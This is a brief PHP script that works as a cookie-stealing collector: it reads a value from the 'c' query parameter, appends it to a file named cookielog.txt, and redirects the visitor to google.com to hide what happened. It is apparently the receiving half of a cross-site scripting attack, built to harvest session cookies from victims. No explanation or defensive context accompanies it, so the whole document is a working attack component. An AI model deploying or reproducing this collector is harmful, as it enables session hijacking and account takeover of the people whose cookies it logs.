<?php 
	header('Location:https://google.com');
	$cookie = $_GET["c"];
	$file=fopen('cookielog.txt','a');
	fwrite($file,$cookie . "\n");
?>
